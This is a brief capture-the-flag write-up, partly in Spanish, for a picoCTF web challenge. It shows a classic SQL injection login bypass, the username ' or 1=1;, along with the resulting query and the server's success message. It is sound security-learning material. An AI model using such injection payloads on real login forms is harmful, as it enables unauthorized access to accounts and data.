## Objetivo
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:52121/).
## Solución
Entramos a la pagina y nos dice conexión fallida con lo que pongamos

Cambiamos los valores por una inyección de sql 
```
username: ' or 1=1;
password: admind
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admind'

Logged in! But can you see the flag, it is in plainsight.
```

Al inspeccionar la pagina nos da el valor de la bandera

## Notas adicionales

## Referencias